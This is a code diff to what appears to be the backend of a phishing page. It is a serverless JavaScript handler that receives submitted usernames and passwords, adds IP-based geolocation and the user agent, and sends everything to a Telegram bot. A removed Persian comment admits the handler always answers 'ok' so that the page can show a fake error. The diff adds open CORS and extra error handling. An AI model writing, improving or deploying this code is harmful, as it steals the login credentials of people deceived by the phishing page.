@@ -1,4 +1,14 @@
 export default async function handler(req, res) {
+    // CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    // Preflight request
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+
     // فقط POST قبول می‌شه
     if (req.method !== 'POST') {
         return res.status(405).json({ status: 'error', message: 'Method not allowed' });
@@ -9,10 +19,13 @@ export default async function handler(req, res) {
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error('Telegram credentials not set in environment variables');
-        return res.status(500).json({ status: 'error', message: 'Server configuration error' });
+        return res.status(500).json({ 
+            status: 'error', 
+            message: 'Server configuration error - missing Telegram credentials' 
+        });
     }
 
-    // دریافت داده‌های فرم
+    // دریافت داده از body (JSON)
     const username = (req.body?.username || '').trim();
     const password = (req.body?.password || '').trim();
 
@@ -29,12 +42,19 @@ export default async function handler(req, res) {
 
     const userAgent = req.headers['user-agent'] || 'Unknown';
 
-    // موقعیت جغرافیایی از IP (ip-api.com)
+    // موقعیت جغرافیایی از IP
     let location = 'Unknown';
     let isp = 'Unknown';
 
     try {
-        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,country,city,isp,org,as`);
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,country,city,isp,org,as`, {
+            signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+
         if (geoRes.ok) {
             const geo = await geoRes.json();
             if (geo && geo.country) {
@@ -43,7 +63,6 @@ export default async function handler(req, res) {
             }
         }
     } catch (geoErr) {
-        // نادیده گرفتن خطای GeoIP
         console.error('GeoIP error:', geoErr.message);
     }
 
@@ -85,12 +104,19 @@ export default async function handler(req, res) {
 
         if (!telegramData.ok) {
             console.error('Telegram API error:', telegramData);
+            return res.status(200).json({ 
+                status: 'error', 
+                message: 'Telegram error: ' + (telegramData.description || 'Unknown error')
+            });
         }
     } catch (tgErr) {
         console.error('Telegram send error:', tgErr.message);
+        return res.status(200).json({ 
+            status: 'error', 
+            message: 'Telegram connection error: ' + tgErr.message
+        });
     }
 
-    // همیشه status: ok برمی‌گرده تا صفحه خطای جعلی نشون بده
     return res.status(200).json({ status: 'ok' });
 }
 
